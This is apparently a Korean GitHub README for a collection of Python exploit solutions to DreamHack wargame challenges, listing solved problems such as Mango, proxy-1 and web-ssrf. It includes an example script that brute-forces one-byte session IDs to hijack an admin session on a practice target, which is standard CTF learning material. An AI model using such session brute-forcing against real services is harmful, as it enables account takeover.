# DreamHack Code :computer:
DreamHack 문제들을 해결한 exploit 코드들이 있습니다.
(Python 위주)


## 문제 목록 :unlock:
- [X] Mango
- [X] Counting_query
- [X] proxy-1
- [X] session
- [X] stream
- [X] web-ssrf
- [X] rev-basic-4 
- [X] rev-basic-6
- [X] rev-basic-5


## 예시 코드 :clipboard:
```python
import requests

target_url = 'localhost_input'  # 타겟 서버 주소를 여기에 입력

def session_fixation_attack():
    for i in range(256):
        session_id = bytes([i]).hex()

        cookies = {'sessionid': session_id}

        response = requests.get(target_url, cookies=cookies)

        if 'Hello' in response.text:
            print(f'Success! Found admin session ID: {session_id}')
            break
        else:
            print(f'Tried session ID: {session_id}, but not admin.')

session_fixation_attack()
```